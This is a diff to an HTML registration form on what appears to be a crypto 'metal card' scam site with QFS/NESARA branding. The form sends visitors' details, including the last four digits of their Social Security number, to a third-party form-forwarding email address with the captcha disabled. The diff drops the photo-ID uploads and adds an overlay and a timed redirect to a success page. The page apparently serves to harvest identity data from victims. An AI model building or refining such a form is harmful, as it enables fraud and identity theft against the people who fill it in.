@@ -5,20 +5,49 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Registration Form</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Overlay for submission */
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.5s ease;
+    }
+
+    #overlay.show {
+      opacity: 1;
+      pointer-events: all;
+    }
+  </style>
 </head>
 
 <body class="bg-gray-100 p-6">
+  <!-- Overlay -->
+  <div id="overlay">
+    <div class="bg-white p-6 rounded-lg shadow-lg text-center">
+      <p class="text-lg font-semibold">Submitting… please wait</p>
+    </div>
+  </div>
+
   <div class="max-w-xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
     <h2 class="text-2xl font-bold text-center mb-6">Registration Form</h2>
 
-    <form action="https://formsubmit.co/support@qfsnesaragesara.org"
+    <form id="registrationForm" 
+          action="https://formsubmit.co/support@qfsnesaragesara.org"
           method="POST"
-          enctype="multipart/form-data"
           class="space-y-4">
 
-      <!-- Success Redirect -->
-      <input type="hidden" name="_next" value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success.html">
-
+      <!-- Absolute URL Redirect -->
+      <input type="hidden" name="_next" value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-registration.html">
 
       <!-- Disable Captcha -->
       <input type="hidden" name="_captcha" value="false">
@@ -66,7 +95,7 @@
       </div>
 
       <div>
-        <label class="font-semibold">Last 4 of SSN</label>
+        <label class="font-semibold">Last 4 Digit of SSN</label>
         <input type="text" name="ssn_last4" maxlength="4" pattern="\d{4}" required class="w-full mt-1 p-3 border rounded-lg" />
       </div>
 
@@ -81,20 +110,28 @@
         </select>
       </div>
 
-      <div>
-        <label class="font-semibold">Upload Photo ID (Front)</label>
-        <input type="file" name="photo_id_front" accept="image/*,.pdf" required class="w-full mt-1 p-3 border rounded-lg" />
-      </div>
-
-      <div>
-        <label class="font-semibold">Upload Photo ID (Back)</label>
-        <input type="file" name="photo_id_back" accept="image/*,.pdf" required class="w-full mt-1 p-3 border rounded-lg" />
-      </div>
-
+      <!-- Submit Button -->
       <button type="submit" class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700">
         Submit Registration
       </button>
+
     </form>
   </div>
+
+  <script>
+    const form = document.getElementById("registrationForm");
+    const overlay = document.getElementById("overlay");
+
+    form.addEventListener("submit", function(e){
+        // Show overlay with fade-in
+        overlay.classList.add("show");
+
+        // Redirect after 1 second using absolute URL
+        setTimeout(function(){
+            overlay.classList.remove("show");
+            window.location.href = "https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-registration.html";
+        }, 1000); 
+    });
+  </script>
 </body>
 </html>
